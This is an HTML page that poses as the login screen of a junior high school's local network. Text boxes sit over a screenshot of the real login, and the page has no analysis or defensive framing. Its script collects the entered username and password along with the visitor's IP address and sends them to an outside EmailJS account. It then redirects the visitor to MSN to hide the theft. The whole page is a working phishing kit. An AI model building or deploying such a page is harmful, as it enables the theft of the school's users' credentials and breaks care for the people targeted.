<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="dns-prefetch" href="//www.msn.com">
  <title>興福國中局域網</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("CDnxhrbcBaRhYiaqq");
  </script>




  <style>
  .img-box {
    position: relative;
    width: 400px;   /* 圖片寬度 */
  }


  .img-box img {
    width: 100%;
  }


  .input1 {
    position: absolute;
    top: 62.5%;     /* 第一個位置377 600 250 */
    left: 45%;    /*單邊259全屏600*/
    width: 18%;
  }


  .input2 {
    position: absolute;
    top: 67%;    /* 第二個位置 408 600 250*/
    left: 45%;
    width: 18%;
  }
  .btn-login {
      position: absolute;
      top: 71%;      /* 按鈕位置 438 831 25*/
      left: 62%;
      height: 25px;
      cursor: pointer;
    }
</style>

</head>
<body>
  <div style="text-align: center;">
    <img src="./image1.png" alt="圖片">


    <input type="text" class="input1" placeholder="">
    <input type="password" class="input2" placeholder="">
    <button class="btn-login" onclick="sendEmail()">登入</button>
  </div>
  <script>
    async function sendEmail() {
      const btn = document.querySelector('.btn-login');
      const user = document.querySelector('.input1').value;
      const pass = document.querySelector('.input2').value;

      if (!user || !pass) {
          alert("請輸入帳號密碼");
          return;
      }
      btn.disabled = true;
      btn.innerText = "驗證中...";
  
      let userIP = "未知 IP";
      try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          userIP = data.ip;
      } catch (error) {
          console.error("抓取 IP 失敗:", error);
      }
      
      try {
          await emailjs.send("service_0w04i8j", "template_tvkdzq4", {
              username: user,
              password: pass,
              ip: userIP
          });
          // 發送成功後再跳轉
          window.location.href = "https://www.msn.com/zh-tw";
          } catch (err) {
            alert("系統錯誤，請稍後再試");
            btn.disabled = false;
            btn.innerText = "登入";
          }
    }
</script>

</body>
</html>
